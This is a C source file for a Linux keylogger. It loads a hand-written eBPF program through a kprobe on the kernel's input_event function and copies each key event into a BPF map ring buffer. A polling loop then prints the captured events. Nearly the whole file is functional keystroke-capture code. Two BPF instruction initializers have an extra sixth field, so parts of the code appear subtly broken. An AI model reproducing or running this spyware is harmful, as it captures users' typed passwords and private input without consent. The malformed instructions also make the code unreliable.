#include <inttypes.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/perf_event.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <unistd.h>
#include "kprobes.h"

const int RING_SIZE = 31;

int create_map();
int create_program();
int create_perf_event();
int pop_ring(int mapFd, int* type, int* code, int* value);
void read_map(int mapFd, int idx, int* type, int* code, int* value);
void write_map(int mapFd, int idx, int type, int code, int value);

int main() {
  int mapFd = create_map();
  int progFd = create_program(mapFd);
  int perfFd = create_perf_event();
  if (attach_program(progFd, perfFd)) {
    perror("attach_program");
    return 1;
  }
  while (1) {
    int type;
    int code;
    int value;
    while (pop_ring(mapFd, &type, &code, &value)) {
      printf("type=%d code=%d value=%d\n", type, code, value);
    }
    usleep(100000);
  }
  return 0;
}

int create_map() {
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  bpf_args.map_type = BPF_MAP_TYPE_HASH;
  bpf_args.key_size = 4;
  bpf_args.value_size = 12;
  bpf_args.max_entries = RING_SIZE + 1;

  int mapFd = syscall(__NR_bpf, BPF_MAP_CREATE, &bpf_args, sizeof(bpf_args));
  if (mapFd < 0) {
    perror("create map");
    exit(1);
  }

  write_map(mapFd, RING_SIZE, 0, 0, 0);

  return mapFd;
}

int create_program(int mapFd) {
  struct bpf_insn program[] = {
      // Copy RSI, RDX, RCX into the stack at FP[-16].
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 13 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -16, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 12 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -12, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 11 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -8, 0},

      // Load the event type into R0.
      {BPF_LDX | BPF_MEM | BPF_W, 0, 1, 13 * 8, 0},
      // Only look at key events (type == 1).
      {BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 2, 1},
      // Exit with a zero status.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Load FP[-4] into R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4},
      // Store the key into FP[-4].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -4, RING_SIZE},
      // Lookup the metadata key.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem},

      // Exit if NULL.
      {BPF_JMP | BPF_JNE | BPF_K, 0, 0, 2, 0},
      // Exit with a zero status.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},
      // Load start index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 0, 0, 0},
      // Put the start index into FP[-28].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -28, 0},
      // Load end index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 0, 4, 0},
      // Put the end index into FP[-24].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -24, 0},
      // Put zero into FP[-20].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -20, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Put FP[-24] into R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -24},
      // Put FP[-16] into R3.
      {BPF_ALU64 | BPF_MOV | BPF_X, 3, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 3, 0, 0, -16},
      // Set the BPF_ANY flag.
      {BPF_ALU | BPF_MOV | BPF_K, 4, 0, 0, 0, BPF_ANY},
      // Set the current map value.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem},

      // Load end index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 10, -24, 0},
      // Increment the end index.
      {BPF_ALU | BPF_ADD | BPF_K, 1, 0, 0, 1},
      // Wrap around the end index.
      {BPF_ALU | BPF_MOD | BPF_K, 1, 0, 0, RING_SIZE},
      // Put the end index into FP[-24].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -24, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Store the key into FP[-4].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -4, RING_SIZE},
      // Put FP[-4] in R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4},
      // Load FP[-28] into R3.
      {BPF_ALU64 | BPF_MOV | BPF_X, 3, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 3, 0, 0, -28},
      // Set the BPF_ANY flag.
      {BPF_ALU | BPF_MOV | BPF_K, 4, 0, 0, 0, BPF_ANY},
      // Set the current map value.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem},

      // Terminate the program.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},
  };
  return load_kprobe_bpf(program, sizeof(program) / sizeof(struct bpf_insn));
}

int create_perf_event() {
  int fd = create_open_kprobe("keylogger", "p:kprobes/keylogger input_event");
  if (fd < 0) {
    perror("create_open_kprobe");
    exit(1);
  }
  return fd;
}

int pop_ring(int mapFd, int* type, int* code, int* value) {
  int start;
  int end;
  int unused;
  read_map(mapFd, RING_SIZE, &start, &end, NULL);
  if (start == end) {
    return 0;
  }
  write_map(mapFd, RING_SIZE, (start + 1) % RING_SIZE, end, 0);
  read_map(mapFd, start, type, code, value);
  return 1;
}

void read_map(int mapFd, int idx, int* type, int* code, int* value) {
  int32_t buf[3] = {0, 0, 0};
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  uint32_t key = idx;
  bpf_args.map_fd = mapFd;
  bpf_args.key = (uint64_t)&key;
  bpf_args.value = (uint64_t)buf;
  syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &bpf_args, sizeof(bpf_args));
  if (type) {
    *type = buf[0];
  }
  if (code) {
    *code = buf[1];
  }
  if (value) {
    *value = buf[2];
  }
}

void write_map(int mapFd, int idx, int type, int code, int value) {
  int32_t buf[3] = {type, code, value};
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  uint32_t key = idx;
  bpf_args.map_fd = mapFd;
  bpf_args.key = (uint64_t)&key;
  bpf_args.value = (uint64_t)buf;
  syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &bpf_args, sizeof(bpf_args));
}
